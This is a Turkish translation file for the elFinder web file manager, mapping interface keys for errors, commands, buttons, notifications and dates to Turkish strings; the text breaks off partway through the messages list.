/**
 * Türkçe translation
 * @author I.Taskinoglu & A.Kaya <alikaya@armsyazilim.com>
 * @author Abdullah ELEN <abdullahelen@msn.com>
 * @author Osman KAYAN <osmnkayan@gmail.com>
 * @author alikayan95@gmail.com
 * @author Cengiz AKCAN cengiz@vobo.company
 * @version 2022-03-03
 */
 (function(root, factory) {
	if (typeof define === 'function' && define.amd) {
		define(['elfinder'], factory);
	} else if (typeof exports !== 'undefined') {
		module.exports = factory(require('elfinder'));
	} else {
		factory(root.elFinder);
	}
}(this, function(elFinder) {
	elFinder.prototype.i18.tr = {
		translator : 'I.Taskinoglu & A.Kaya &lt;alikaya@armsyazilim.com&gt;, Abdullah ELEN &lt;abdullahelen@msn.com&gt;, Osman KAYAN &lt;osmnkayan@gmail.com&gt;, alikayan95@gmail.com, Cengiz AKCAN cengiz@vobo.company',
		language   : 'Türkçe',
		direction  : 'ltr',
		dateFormat : 'd.m.Y H:i', // will show like: 03.03.2022 15:56
		fancyDateFormat : '$1 H:i', // will show like: Bugün 15:56
		nonameDateFormat : 'ymd-His', // noname upload will show like: 220303-155625
		messages   : {
			'getShareText' : 'Paylaş',
			'Editor ': 'Kod Düzenleyici',
			

			/********************************** errors **********************************/
			'error'                : 'Hata',
			'errUnknown'           : 'Bilinmeyen hata.',
			'errUnknownCmd'        : 'Bilinmeyen komut.',
			'errJqui'              : 'Geçersiz jQuery UI yapılandırması. Seçilebilir, sürükle ve bırak bileşenlerini içermelidir.',
			'errNode'              : 'elFinder, DOM Element\'ini oluşturması gerekir.',
			'errURL'               : 'Geçersiz elFinder yapılandırması! URL seçeneği ayarlı değil.',
			'errAccess'            : 'Erişim engellendi.',
			'errConnect'           : 'Sunucuya bağlanamıyor.',
			'errAbort'             : 'Bağlantı durduruldu.',
			'errTimeout'           : 'Bağlantı zaman aşımı.',
			'errNotFound'          : 'Sunucu bulunamadı.',
			'errResponse'          : 'Geçersiz sunucu yanıtı.',
			'errConf'              : 'Geçersiz sunucu yapılandırması.',
			'errJSON'              : 'PHP JSON modülü kurulu değil.',
			'errNoVolumes'         : 'Okunabilir birimler mevcut değil.',
			'errCmdParams'         : '"$1" komutu için geçersiz parametre.',
			'errDataNotJSON'       : 'Bu veri JSON formatında değil.',
			'errDataEmpty'         : 'Boş veri.',
			'errCmdReq'            : 'Sunucu isteği için komut adı gerekli.',
			'errOpen'              : '"$1" açılamıyor.',
			'errNotFolder'         : 'Bu nesne bir klasör değil.',
			'errNotFile'           : 'Bu nesne bir dosya değil.',
			'errRead'              : '"$1" okunamıyor.',
			'errWrite'             : '"$1" yazılamıyor.',
			'errPerm'              : 'Yetki engellendi.',
			'errLocked'            : '"$1" kilitli. Bu nedenle taşıma, yeniden adlandırma veya kaldırma yapılamıyor.',
			'errExists'            : '"$1" adında bir dosya zaten var.',
			'errInvName'           : 'Geçersiz dosya ismi.',
			'errInvDirname'        : 'Geçersiz klasör ismi',  // from v2.1.24 added 12.4.2017
			'errFolderNotFound'    : 'Klasör bulunamıyor.',
			'errFileNotFound'      : 'Dosya bulunamadı.',
			'errTrgFolderNotFound' : 'Hedef klasör "$1" bulunamadı.',
			'errPopup'             : 'Tarayıcı popup penceresi açmayı engelledi. Tarayıcı ayarlarından dosya açmayı aktif hale getirin.',
			'errMkdir'             : 'Klasör oluşturulamıyor "$1".',
			'errMkfile'            : '"$1" dosyası oluşturulamıyor.',
			'errRename'            : '"$1" yeniden adlandırma yapılamıyor.',
			'errCopyFrom'          : '"$1" biriminden dosya kopyalamaya izin verilmedi.',
			'errCopyTo'            : '"$1" birimine dosya kopyalamaya izin verilmedi.',
			'errMkOutLink'         : 'Kök birim dışında bir bağlantı oluşturulamıyor', // from v2.1 added 03.10.2015
			'errUpload'            : 'Dosya yükleme hatası.',  // old name - errUploadCommon
			'errUploadFile'        : '"$1" dosya yüklenemedi.', // old name - errUpload
			'errUploadNoFiles'     : 'Yüklenecek dosya bulunamadı.',
			'errUploadTotalSize'   : 'Veri izin verilen boyuttan büyük.', // old name - errMaxSize
			'errUploadFileSize'    : 'Dosya izin verilen boyuttan büyük.', //  old name - errFileMaxSize
			'errUploadMime'        : 'Dosya türüne izin verilmedi.',
			'errUploadTransfer'    : '"$1" transfer hatası.',
			'errUploadTemp'        : 'Yükleme için geçici dosya yapılamıyor.', // from v2.1 added 26.09.2015
			'errNotReplace'        : '"$1" nesnesi bu konumda zaten var ve başka türde nesne ile değiştirilemez.', // new
			'errReplace'           : 'Değişiklik yapılamıyor "$1".',
			'errSave'              : '"$1" kaydedilemiyor.',
			'errCopy'              : '"$1" kopyalanamıyor.',
			'errMove'              : '"$1" taşınamıyor.',
			'errCopyInItself'      : '"$1" kendi içine kopyalanamaz.',
			'errRm'                : '"$1" kaldırılamıyor.',
			'errTrash'             : 'Çöp kutusuna taşınamıyor.', // from v2.1.24 added 30.4.2017
			'errRmSrc'             : 'Kaynak dosya(lar) kaldırılamıyor.',
			'errExtract'           : '"$1" kaynağından dosyalar çıkartılamıyor.',
			'errArchive'           : 'Arşiv oluşturulamıyor.',
			'errArcType'           : 'Desteklenmeyen arşiv türü.',
			'errNoArchive'         : 'Dosya arşiv değil veya desteklenmeyen arşiv türü.',
			'errCmdNoSupport'      : 'Sunucu bu komutu desteklemiyor.',
			'errReplByChild'       : '“$1” klasörü içerdiği bir öğe tarafından değiştirilemez.',
			'errArcSymlinks'       : 'Sembolik bağlantıları içeren arşivlerin açılması güvenlik nedeniyle reddedildi.', // edited 24.06.2012
			'errArcMaxSize'        : 'Arşiv dosyaları izin verilen maksimum boyutu aştı.',
			'errResize'            : '"$1" yeniden boyutlandırılamıyor.',
			'errResizeDegree'      : 'Geçersiz döndürme derecesi.',  // added 7.3.2013
			'errResizeRotate'      : 'Resim döndürülemiyor.',  // added 7.3.2013
			'errResizeSize'        : 'Geçersiz resim boyutu.',  // added 7.3.2013
			'errResizeNoChange'    : 'Resim boyutu değiştirilemez.',  // added 7.3.2013
			'errUsupportType'      : 'Desteklenmeyen dosya türü.',
			'errNotUTF8Content'    : 'Dosya "$1" UTF-8 olmadığından düzenlenemez.',  // added 9.11.2011
			'errNetMount'          : '"$1" bağlanamadı.', // added 17.04.2012
			'errNetMountNoDriver'  : 'Desteklenmeyen protokol.',     // added 17.04.2012
			'errNetMountFailed'    : 'Bağlama hatası.',         // added 17.04.2012
			'errNetMountHostReq'   : 'Sunucu gerekli.', // added 18.04.2012
			'errSessionExpires'    : 'Uzun süre işlem yapılmadığından oturumunuz sonlandı.',
			'errCreatingTempDir'   : 'Geçici dizin oluşturulamıyor: "$1"',
			'errFtpDownloadFile'   : 'Dosya FTP: "$1" adresinden indirilemiyor.',
			'errFtpUploadFile'     : 'Dosya FTP: "$1" adresine yüklenemiyor.',
			'errFtpMkdir'          : 'FTP: "$1" üzerinde uzak dizin oluşturulamıyor.',
			'errArchiveExec'       : '"$1" Dosyalarında arşivlenirken hata oluştu.',
			'errExtractExec'       : '"$1" Dosyaları arşivden çıkartılırken hata oluştu.',
			'errNetUnMount'        : 'Bağlantı kaldırılamıyor.', // from v2.1 added 30.04.2012
			'errConvUTF8'          : 'UTF-8\'e dönüştürülemez.', // from v2.1 added 08.04.2014
			'errFolderUpload'      : 'Klasör yükleyebilmek için daha modern bir tarayıcıya ihtiyacınız var.', // from v2.1 added 26.6.2015
			'errSearchTimeout'     : '"$1" araması zaman aşımına uğradı. Kısmi arama sonuçları listeleniyor.', // from v2.1 added 12.1.2016
			'errReauthRequire'     : 'Yeniden yetkilendirme gerekiyor.', // from v2.1.10 added 24.3.2016
			'errMaxTargets'        : 'Maksimum seçilebilir öge sayısı $1 adettir', // from v2.1.17 added 17.10.2016
			'errRestore'           : 'Çöp kutusundan geri yüklenemiyor. Geri yükleme notkası belirlenemiyor.', // from v2.1.24 added 3.5.2017
			'errEditorNotFound'    : 'Editör bu dosya türünü bulamıyor.', // from v2.1.25 added 23.5.2017
			'errServerError'       : 'Sunucu tarafında beklenilmeyen bir hata oluştu.', // from v2.1.25 added 16.6.2017
			'errEmpty'             : '"$1" klasörü boşaltılamıyor.', // from v2.1.25 added 22.6.2017
			'moreErrors'           : '"$1" veya daha fazla hata', // from v2.1.44 added 9.12.2018
			'errMaxMkdirs'         : 'Tek seferde 1$\'a kadar klasör oluşturabilirsiniz.', // from v2.1.58 added 20.6.2021

			/******************************* commands names ********************************/
			'cmdarchive'   : 'Arşiv oluştur',
			'cmdback'      : 'Geri',
			'cmdcopy'      : 'Kopyala',
			'cmdcut'       : 'Kes',
			'cmddownload'  : 'İndir',
			'cmdduplicate' : 'Çoğalt',
			'cmdedit'      : 'Dosyayı düzenle',
			'cmdextract'   : 'Arşivden dosyaları çıkart',
			'cmdforward'   : 'İleri',
			'cmdgetfile'   : 'Dosyaları seç',
			'cmdhelp'      : 'Bu yazılım hakkında',
			'cmdhome'      : 'Anasayfa',
			'cmdinfo'      : 'Bilgi göster',
			'cmdmkdir'     : 'Yeni klasör',
			'cmdmkdirin'   : 'Yeni Klasör / aç', // from v2.1.7 added 19.2.2016
			'cmdmkfile'    : 'Yeni dosya',
			'cmdopen'      : 'Aç',
			'cmdpaste'     : 'Yapıştır',
			'cmdquicklook' : 'Ön izleme',
			'cmdreload'    : 'Geri Yükle',
			'cmdrename'    : 'Yeniden Adlandır',
			'cmdrm'        : 'Sil',
			'cmdtrash'     : 'Çöpe at', //from v2.1.24 added 29.4.2017
			'cmdrestore'   : 'geri yükle', //from v2.1.24 added 3.5.2017
			'cmdsearch'    : 'Dosyaları bul',
			'cmdup'        : 'Üst dizine çık',
			'cmdupload'    : 'Dosyaları yükle',
			'cmdview'      : 'Görüntüle',
			'cmdresize'    : 'Resmi yeniden boyutlandır',
			'cmdsort'      : 'Sırala',
			'cmdnetmount'  : 'Bağlı ağ birimi', // added 18.04.2012
			'cmdnetunmount': 'Devredışı bırak', // from v2.1 added 30.04.2012
			'cmdplaces'    : 'Yerlere', // added 28.12.2014
			'cmdchmod'     : 'Mod değiştir', // from v2.1 added 20.6.2015
			'cmdopendir'   : 'Klasör aç', // from v2.1 added 13.1.2016
			'cmdcolwidth'  : 'Sütun genişliğini sıfırla', // from v2.1.13 added 12.06.2016
			'cmdfullscreen': 'Tam ekran', // from v2.1.15 added 03.08.2016
			'cmdmove'      : 'Taşı', // from v2.1.15 added 21.08.2016
			'cmdempty'     : 'Klasörü boşalt', // from v2.1.25 added 22.06.2017
			'cmdundo'      : 'Geri al', // from v2.1.27 added 31.07.2017
			'cmdredo'      : 'Yinele', // from v2.1.27 added 31.07.2017
			'cmdpreference': 'Tercihler', // from v2.1.27 added 03.08.2017
			'cmdselectall' : 'Tümünü seç', // from v2.1.28 added 15.08.2017
			'cmdselectnone': 'Seçimi temizle', // from v2.1.28 added 15.08.2017
			'cmdselectinvert': 'Diğerlerini seç', // from v2.1.28 added 15.08.2017
			'cmdopennew'   : 'Yeni Sekmede aç', // from v2.1.38 added 3.4.2018
			'cmdhide'      : 'Ögeyi Gizle', // from v2.1.41 added 24.7.2018

			/*********************************** buttons ***********************************/
			'btnClose'  : 'Kapat',
			'btnSave'   : 'Kaydet',
			'btnRm'     : 'Kaldır',
			'btnApply'  : 'Uygula',
			'btnCancel' : 'İptal',
			'btnNo'     : 'Hayır',
			'btnYes'    : 'Evet',
			'btnMount'  : 'Bağla',  // added 18.04.2012
			'btnApprove': 'Git $1 & onayla', // from v2.1 added 26.04.2012
			'btnUnmount': 'Bağlantıyı kes', // from v2.1 added 30.04.2012
			'btnConv'   : 'Dönüştür', // from v2.1 added 08.04.2014
			'btnCwd'    : 'Buraya',      // from v2.1 added 22.5.2015
			'btnVolume' : 'Birim',    // from v2.1 added 22.5.2015
			'btnAll'    : 'Hepsi',       // from v2.1 added 22.5.2015
			'btnMime'   : 'MIME Türü', // from v2.1 added 22.5.2015
			'btnFileName':'Dosya adı',  // from v2.1 added 22.5.2015
			'btnSaveClose': 'Kaydet & Kapat', // from v2.1 added 12.6.2015
			'btnBackup' : 'Yedekle', // fromv2.1 added 28.11.2015
			'btnRename'    : 'Yeniden adlandır',      // from v2.1.24 added 6.4.2017
			'btnRenameAll' : 'Yeniden adlandır(Tümü)', // from v2.1.24 added 6.4.2017
			'btnPrevious' : 'Önceki ($1/$2)', // from v2.1.24 added 11.5.2017
			'btnNext'     : 'Sonraki ($1/$2)', // from v2.1.24 added 11.5.2017
			'btnSaveAs'   : 'Farklı Kaydet', // from v2.1.25 added 24.5.2017

			/******************************** notifications ********************************/
			'ntfopen'     : 'Klasör Aç',
			'ntffile'     : 'Dosya Aç',
			'ntfreload'   : 'Klasör içeriğini yeniden yükle',
			'ntfmkdir'    : 'Dizin oluşturuluyor',
			'ntfmkfile'   : 'Dosyaları oluşturma',
			'ntfrm'       : 'Dosyaları sil',
			'ntfcopy'     : 'Dosyaları kopyala',
			'ntfmove'     : 'Dosyaları taşı',
			'ntfprepare'  : 'Dosyaları kopyalamaya hazırla',
			'ntfrename'   : 'Dosyaları yeniden adlandır',
			'ntfupload'   : 'Dosyalar yükleniyor',
			'ntfdownload' : 'Dosyalar indiriliyor',
			'ntfsave'     : 'Dosyalar kaydediliyor',
			'ntfarchive'  : 'Arşiv oluşturuluyor',
			'ntfextract'  : 'Arşivden dosyalar çıkartılıyor',
			'ntfsearch'   : 'Dosyalar aranıyor',
			'ntfresize'   : 'Resimler boyutlandırılıyor',
			'ntfsmth'     : 'İşlem yapılıyor',
			'ntfloadimg'  : 'Resim yükleniyor',
			'ntfnetmount' : 'Ağ birimine bağlanılıyor', // added 18.04.2012
			'ntfnetunmount': 'Ağ birimi bağlantısı kesiliyor', // from v2.1 added 30.04.2012
			'ntfdim'      : 'Resim boyutu alınıyor', // added 20.05.2013
			'ntfreaddir'  : 'Klasör bilgisi okunuyor', // from v2.1 added 01.07.2013
			'ntfurl'      : 'Bağlantının URL\'si alınıyor', // from v2.1 added 11.03.2014
			'ntfchmod'    : 'Dosya modu değiştiriliyor', // from v2.1 added 20.6.2015
			'ntfpreupload': 'Yüklenen dosya ismi doğrulanıyor', // from v2.1 added 31.11.2015
			'ntfzipdl'    : 'İndirilecek dosya oluşturuluyor', // from v2.1.7 added 23.1.2016
			'ntfparents'  : 'Dosya yolu bilgileri alınıyor', // from v2.1.17 added 2.11.2016
			'ntfchunkmerge': 'Yüklenen dosya işleniyor', // from v2.1.17 added 2.11.2016
			'ntftrash'    : 'Çöp kutusuna atma', // from v2.1.24 added 2.5.2017
			'ntfrestore'  : 'Çöp kutusundan geri yükle', // from v2.1.24 added 3.5.2017
			'ntfchkdir'   : 'Hedef klasör kontrol ediliyor', // from v2.1.24 added 3.5.2017
			'ntfundo'     : 'Önceki işlemi geri alma', // from v2.1.27 added 31.07.2017
			'ntfredo'     : 'Önceki geri almayı tekrarlama', // from v2.1.27 added 31.07.2017
			'ntfchkcontent' : 'İçeriği kontrol ediniz', // from v2.1.41 added 3.8.2018

			/*********************************** volumes *********************************/
			'volume_Trash' : 'Çöp', //from v2.1.24 added 29.4.2017

			/************************************ dates **********************************/
			'dateUnknown' : 'Bilinmiyor',
			'Today'       : 'Bugün',
			'Yesterday'   : 'Dün',
			'msJan'       : 'Oca',
			'msFeb'       : 'Şub',
			'msMar'       : 'Mart',
			'msApr'       : 'Nis',
			'msMay'       : 'Mayıs',
			'msJun'       : 'Haz',
			'msJul'       : 'Tem',
			'msAug'       : 'Ağu',
			'msSep'       : 'Eyl',
			'msOct'       : 'Ekm',
			'msNov'       : 'Kas',
			'msDec'       : 'Ara',
			'January'     : 'Ocak',
			'February'    : 'Şubat',
			'March'       : 'Mart',
			'April'       : 'Nisan',
			'May'         : 'Mayıs',
			'June'        : 'Haziran',
			'July'        : 'Temmuz',
			'August'      : 'Ağustos',
			'September'   : 'Eylül',
			'October'     : 'Ekim',
			'November'    : 'Kasım',
			'December'    : 'Aralık',
			'Sunday'      : 'Pazar',
			'Monday'      : 'Pazartesi',
			'Tuesday'     : 'Salı',
			'Wednesday'   : 'Çarşamba',
			'Thursday'    : 'Perşembe',
			'Friday'      : 'Cuma',
			'Saturday'    : 'Cumartesi',
			'Sun'         : 'Paz',
			'Mon'         : 'Pzt',
			'Tue'         : 'Sal',
			'Wed'         : 'Çar',
			'Thu'         : 'Per',
			'Fri'         : 'Cum',
			'Sat'         : 'Cmt',

			/******************************** sort variants ********************************/
			'sortname'          : 'Ada göre',
			'sortkind'          : 'Türe göre',
			'sortsize'          : 'Boyuta göre',
			'sortdate'          : 'Tarihe göre',
			'sortFoldersFirst'  : 'Önce klasörler',
			'sortperm'          : 'izinlere göre', // from v2.1.13 added 13.06.2016
			'sortmode'          : 'moduna göre',       // from v2.1.13 added 13.06.2016
			'sortowner'         : 'sahibine göre',      // from v2.1.13 added 13.06.2016
			'sortgroup'         : 'grubuna göre',      // from v2.1.13 added 13.06.2016
			'sortAlsoTreeview'  : 'Ayrıca ağaç görünümü',  // from v2.1.15 added 01.08.2016

			/********************************** new items **********************************/
			'untitled file.txt' : 'YeniDosya.txt', // added 10.11.2015
			'untitled folder'   : 'YeniKlasor',   // added 10.11.2015
			'Archive'           : 'YeniArsiv',  // from v2.1 added 10.11.2015
			'untitled file'     : 'YeniDosya.$1',  // from v2.1.41 added 6.8.2018
			'extentionfile'     : '$1: Dosya',    // from v2.1.41 added 6.8.2018
			'extentiontype'     : '$1: $2',      // from v2.1.43 added 17.10.2018

			/********************************** messages **********************************/
			'confirmReq'      : 'Onay gerekli',
			'confirmRm'       : 'Dosyaları kaldırmak istediğinden emin misin?<br/>Bu işlem geri alınamaz!',
			'confirmRepl'     : 'Eski dosya yenisi ile değiştirilsin mi?',
			'confirmRest'     : 'Mevcut öge çöp kutusundaki ögeyle değiştirilsin mi?', // fromv2.1.24 added 5.5.2017
			'confirmConvUTF8' : 'UTF-8 değil<br/>UTF-8\'e dönüştürülsün mü?<br/>Dönüştürme sonrası kaydedebilmek için içeriğin UTF-8 olması gerekir.', // from v2.1 added 08.04.2014
			'confirmNonUTF8'  : 'Bu dosyanın karakter kodlaması tespit edilemedi. Düzenleme için geçici olarak UTF-8\'e dönüştürülmesi gerekir.<br/>Lütfen bu dosyanın karakter kodlamasını seçin.', // from v2.1.19 added 28.11.2016
			'confirmNotSave'  : 'Düzenlenmiş içerik.<br/>Değişiklikleri kaydetmek istemiyorsanız son yapılanlar kaybolacak.', // from v2.1 added 15.7.2015
			'confirmTrash'    : 'Öğeleri çöp kutusuna taşımak istediğinizden emin misiniz?', //from v2.1.24 added 29.4.2017
			'confirmMove'     : '"$1" değiştirmek istediğinizden emin misiniz?', //from v2.1.50 added 27.7.2019
			'apllyAll'        : 'Tümüne uygula',
			'name'            : 'İsim',
			'size'            : 'Boyut',
			'perms'           : 'Yetkiler',
			'modify'          : 'Değiştirildi',
			'kind'            : 'Tür',
			'read'            : 'oku',
			'write'           : 'yaz',
			'noaccess'        : 'erişim yok',
			'and'             : 've',
			'unknown'         : 'bilinimiyor',
			'selectall'       : 'Tüm dosyaları seç',
			'selectfiles'     : 'Dosya(lar)ı seç',
			'selectffile'     : 'İlk dosyayı seç',
			'selectlfile'     : 'Son dosyayı seç',
			'viewlist'        : 'Liste görünümü',
			'viewicons'       : 'Simge görünümü',
			'viewSmall'       : 'Small iconlar', // from v2.1.39 added 22.5.2018
			'viewMedium'      : 'Medium iconlar', // from v2.1.39 added 22.5.2018
			'viewLarge'       : 'Large iconlar', // from v2.1.39 added 22.5.2018
			'viewExtraLarge'  : 'Extra large iconlar', // from v2.1.39 added 22.5.2018
			'places'          : 'Yerler',
			'calc'            : 'Hesapla',
			'path'            : 'Yol',
			'aliasfor'        : 'Takma adı:',
			'locked'          : 'Kilitli',
			'dim'             : 'Ölçüler',
			'files'           : 'Dosyalar',
			'folders'         : 'Klasörler',
			'items'           : 'Nesneler',
			'yes'             : 'evet',
			'no'              : 'hayır',
			'link'            : 'Bağlantı',
			'searcresult'     : 'Arama sonuçları',
			'selected'        : 'Seçili öğeler',
			'about'           : 'Hakkında',
			'shortcuts'       : 'Kısayollar',
			'help'            : 'Yardım',
			'webfm'           : 'Web dosyası yöneticisi',
			'ver'             : 'Sürüm',
			'protocolver'     : 'protokol sürümü',
			'homepage'        : 'Proje Anasayfası',
			'docs'            : 'Belgeler',
			'github'          : 'Github\'ta bizi takip edin',
			'twitter'         : 'Twitter\'da bizi takip edin',
			'facebook'        : 'Facebook\'ta bize katılın',
			'team'            : 'Takım',
			'chiefdev'        : 'geliştirici şefi',
			'developer'       : 'geliştirici',
			'contributor'     : 'iştirakçi',
			'maintainer'      : 'bakıcı',
			'translator'      : 'çeviri',
			'icons'           : 'Simgeler',
			'dontforget'      : 've havlunuzu almayı unutmayın',
			'shortcutsof'     : 'Kısayollar devre dışı',
			'dropFiles'       : 'Dosyaları buraya taşı',
			'or'              : 'veya',
			'selectForUpload' : 'Yüklemek için dosyaları seçin',
			'moveFiles'       : 'Dosyaları taşı',
			'copyFiles'       : 'Dosyaları kopyala',
			'restoreFiles'    : 'Öğeleri geri yükle', // from v2.1.24 added 5.5.2017
			'rmFromPlaces'    : 'Yerlerinden sil',
			'aspectRatio'     : 'Görünüm oranı',
			'scale'           : 'Ölçeklendir',
			'width'           : 'Genişlik',
			'height'          : 'Yükseklik',
			'resize'          : 'Boyutlandır',
			'crop'            : 'Kırp',
			'rotate'          : 'Döndür',
			'rotate-cw'       : '90 derece sağa döndür',
			'rotate-ccw'      : '90 derece sola döndür',
			'degree'          : 'Derece',
			'netMountDialogTitle' : 'Bağlı (Mount) ağ birimi', // added 18.04.2012
			'protocol'            : 'Protokol', // added 18.04.2012
			'host'                : 'Sunucu', // added 18.04.2012
			'port'                : 'Kapı(Port)', // added 18.04.2012
			'user'                : 'Kullanıcı', // added 18.04.2012
			'pass'                : 'Şifre', // added 18.04.2012
			'confirmUnmount'      : 'Bağlantı kesilsin mi $1?',  // from v2.1 added 30.04.2012
			'dropFilesBrowser': 'Dosyaları tarayıcıdan yapıştır veya bırak', // from v2.1 added 30.05.2012
			'dropPasteFiles'  : 'Dosyaları buraya yapıştır veya bırak', // from v2.1 added 07.04.2014
			'encoding'        : 'Kodlama', // from v2.1 added 19.12.2014
			'locale'          : 'Yerel',   // from v2.1 added 19.12.2014
			'searchTarget'    : 'Hedef: $1',                // from v2.1 added 22.5.2015
			'searchMime'      : 'Giriş MIME Türüne Göre Arama', // from v2.1 added 22.5.2015
			'owner'           : 'Sahibi', // from v2.1 added 20.6.2015
			'group'           : 'Grup', // from v2.1 added 20.6.2015
			'other'           : 'Diğer', // from v2.1 added 20.6.2015
			'execute'         : 'Çalıştır', // from v2.1 added 20.6.2015
			'perm'            : 'Yetki', // from v2.1 added 20.6.2015
			'mode'            : 'Mod', // from v2.1 added 20.6.2015
			'emptyFolder'     : 'Klasör boş', // from v2.1.6 added 30.12.2015
			'emptyFolderDrop' : 'Klasör boş\\A Eklemek için sürükleyin', // from v2.1.6 added 30.12.2015
			'emptyFolderLTap' : 'Klasör boş\\A Eklemek için basılı tutun', // from v2.1.6 added 30.12.2015
			'quality'         : 'Kalite', // from v2.1.6 added 5.1.2016
			'autoSync'        : 'Otomatik senkronizasyon',  // from v2.1.6 added 10.1.2016
			'moveUp'          : 'Yukarı taşı',  // from v2.1.6 added 18.1.2016
			'getLink'         : 'URL bağlantısı alın', // from v2.1.7 added 9.2.2016
			'selectedItems'   : 'Seçili öğeler ($1)', // from v2.1.7 added 2.19.2016
			'folderId'        : 'Klasör kimliği', // from v2.1.10 added 3.25.2016
			'offlineAccess'   : 'Çevrimdışı erişime izin ver', // from v2.1.10 added 3.25.2016
			'reAuth'          : 'Yeniden kimlik doğrulaması için', // from v2.1.10 added 3.25.2016
			'nowLoading'      : 'Şimdi yükleniyor...', // from v2.1.12 added 4.26.2016
			'openMulti'       : 'Çoklu dosya aç', // from v2.1.12 added 5.14.2016
			'openMultiConfirm': '$1 dosyalarını açmaya çalışıyorsunuz. Tarayıcıda açmak istediğinizden emin misiniz?', // from v2.1.12 added 5.14.2016
			'emptySearch'     : 'Arama hedefinde eşleşen sonuç bulunamadı.', // from v2.1.12 added 5.16.2016
			'editingFile'     : 'Dosya düzenleniyor.', // from v2.1.13 added 6.3.2016
			'hasSelected'     : '$1 öğe seçtiniz.', // from v2.1.13 added 6.3.2016
			'hasClipboard'    : 'Panonuzda $1 öğeniz var.', // from v2.1.13 added 6.3.2016
			'incSearchOnly'   : 'Artan arama yalnızca geçerli görünümden yapılır.', // from v2.1.13 added 6.30.2016
			'reinstate'       : 'Eski durumuna getir', // from v2.1.15 added 3.8.2016
			'complete'        : '$1 tamamlandı', // from v2.1.15 added 21.8.2016
			'contextmenu'     : 'Durum menüsü', // from v2.1.15 added 9.9.2016
			'pageTurning'     : 'Sayfa çevir', // from v2.1.15 added 10.9.2016
			'volumeRoots'     : 'Disk kök dizini', // from v2.1.16 added 16.9.2016
			'reset'           : 'Sıfırla', // from v2.1.16 added 1.10.2016
			'bgcolor'         : 'Arkaplan rengi', // from v2.1.16 added 1.10.2016
			'colorPicker'     : 'Renk seçici', // from v2.1.16 added 1.10.2016
			'8pxgrid'         : '8px Izgara', // from v2.1.16 added 4.10.2016
			'enabled'         : 'Etkin', // from v2.1.16 added 4.10.2016
			'disabled'        : 'Engelli', // from v2.1.16 added 4.10.2016
			'emptyIncSearch'  : 'Geçerli görünümde arama sonucu bulunamadı. Arama sonucunu genişletmek için \\APress [Enter]  yapın', // from v2.1.16 added 5.10.2016
			'emptyLetSearch'  : 'Geçerli görünümde ilk harf arama sonuçları boş.', // from v2.1.23 added 24.3.2017
			'textLabel'       : 'Metin etiketi', // from v2.1.17 added 13.10.2016
			'minsLeft'        : '$1 dakika kaldı', // from v2.1.17 added 13.11.2016
			'openAsEncoding'  : 'Seçilen kodlamayla yeniden aç', // from v2.1.19 added 2.12.2016
			'saveAsEncoding'  : 'Seçilen kodlamayla kaydet', // from v2.1.19 added 2.12.2016
			'selectFolder'    : 'Klasör seç', // from v2.1.20 added 13.12.2016
			'firstLetterSearch': 'İlk arama sayfası', // from v2.1.23 added 24.3.2017
			'presets'         : 'Hazır ayarlar', // from v2.1.25 added 26.5.2017
			'tooManyToTrash'  : 'çok fazla öge var çöp kutusuna atılamaz.', // from v2.1.25 added 9.6.2017
			'TextArea'        : 'Metin alanı(TextArea)', // from v2.1.25 added 14.6.2017
			'folderToEmpty'   : '"$1" klasörünü boşalt.', // from v2.1.25 added 22.6.2017
			'filderIsEmpty'   : '"$1" klasöründe öge yok.', // from v2.1.25 added 22.6.2017
			'preference'      : 'Tercih', // from v2.1.26 added 28.6.2017
			'language'        : 'Dil ayarları', // from v2.1.26 added 28.6.2017
			'clearBrowserData': 'Bu tarayıcıda kayıtlı ayarları başlat', // from v2.1.26 added 28.6.2017
			'toolbarPref'     : 'Araç çubuğu ayarları', // from v2.1.27 added 2.8.2017
			'charsLeft'       : '... $1 karakter kaldı',  // from v2.1.29 added 30.8.2017
			'linesLeft'       : '... $1 satır kaldı.',  // from v2.1.52 added 16.1.2020
			'sum'             : 'Toplam', // from v2.1.29 added 28.9.2017
			'roughFileSize'   : 'Kaba dosya boyutu', // from v2.1.30 added 2.11.2017
			'autoFocusDialog' : 'Fare ile üzerine gelince diyalog öğesi odaklansın',  // from v2.1.30 added 2.11.2017
			'select'          : 'Seç', // from v2.1.30 added 23.11.2017
			'selectAction'    : 'Dosya seçildiğinde işleme al', // from v2.1.30 added 23.11.2017
			'useStoredEditor' : 'Geçen sefer kullanılan editörle aç', // from v2.1.30 added 23.11.2017
			'selectinvert'    : 'Zıt seçim', // from v2.1.30 added 25.11.2017
			'renameMultiple'  : '$1 seçilen öğeleri $2 gibi yeniden adlandırmak istediğinizden emin misiniz?</br>Bu geri alınamaz!', // from v2.1.31 added 4.12.2017
			'batchRename'     : 'Yığın adını değiştir', // from v2.1.31 added 8.12.2017
			'plusNumber'      : '+ Sayı', // from v2.1.31 added 8.12.2017
			'asPrefix'        : 'Ön ek kele', // from v2.1.31 added 8.12.2017
			'asSuffix'        : 'Son ek ekle', // from v2.1.31 added 8.12.2017
			'changeExtention' : 'Uzantıyı değiştir', // from v2.1.31 added 8.12.2017
			'columnPref'      : 'Sütun ayarları (Liste görünümü)', // from v2.1.32 added 6.2.2018
			'reflectOnImmediate' : 'Tüm değişiklikler hemen arşive yansıtılacaktır.', // from v2.1.33 added 2.3.2018
			'reflectOnUnmount'   : 'Herhangi bir değişiklik, bu birimi kaldırılıncaya kadar yansıtılmayacaktır.', // from v2.1.33 added 2.3.2018
			'unmountChildren' : 'Bu cihaza monte edilen aşağıdaki birim (ler) de bağlanmamıştır. Çıkardığınızdan emin misiniz?', // from v2.1.33 added 5.3.2018
			'selectionInfo'   : 'Seçim Bilgisi', // from v2.1.33 added 7.3.2018
			'hashChecker'     : 'Dosya imza(hash) algoritmaları', // from v2.1.33 added 10.3.2018
			'infoItems'       : 'öğelerin bilgisi (Seçim Bilgi Paneli)', // from v2.1.38 added 28.3.2018
			'pressAgainToExit': 'Çıkmak için tekrar basın.', // from v2.1.38 added 1.4.2018
			'toolbar'         : 'Araç Çubuğu', // from v2.1.38 added 4.4.2018
			'workspace'       : 'Çalışma alanı', // from v2.1.38 added 4.4.2018
			'dialog'          : 'Diyalog', // from v2.1.38 added 4.4.2018
			'all'             : 'Tümü', // from v2.1.38 added 4.4.2018
			'iconSize'        : 'İcon Boyutu (İcon Görünümü İçin)', // from v2.1.39 added 7.5.2018
			'editorMaximized' : 'Maksimum düzenleyici penceresini aç', // from v2.1.40 added 30.6.2018
			'editorConvNoApi' : 'API ile dönüşüm şu anda mevcut olmadığından, lütfen web sitesinde dönüştürün.', //from v2.1.40 added 8.7.2018
